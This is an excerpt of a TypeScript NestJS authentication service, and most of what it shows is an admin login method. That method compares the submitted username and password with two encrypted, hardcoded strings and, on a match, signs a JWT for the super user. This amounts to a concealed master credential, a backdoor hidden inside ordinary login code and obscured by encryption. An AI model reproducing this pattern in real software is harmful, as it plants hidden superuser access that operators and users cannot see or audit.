...
import { createRandomCode, createRandomUid, decrypt, getClientIp, isExpired } from '@/common/utils';
...
export class AuthService {
  ...
  async loginByAdmin(user: AdminLoginDto){
    const { username, password } = user
    if(!username || !password){
      throw new HttpException('未填写账号密码', HttpStatus.BAD_REQUEST)
    }
    if(username === decrypt('goSsUm2c1ZuU8265jcTS9A==') && password === decrypt('BOEcRRMVgEumLRIJXzW89g==')){
      const u = await this.userService.getSuper()
      const { username, id, email, role, openId, client } = u;
      const token = await this.jwtService.sign({ username, id, email, role, openId, client });
      return token
    }
  ...
  getIp() {
    ...
    // Logger.debug(`Your current IP is： [${ipAddress || '获取您的IP失败了...'}]`, 'AUTH');
    // process.on('exit', (code) => {
    //   console.log(`程序已异常退出、退出码为 ${code}`);
    // });
  }
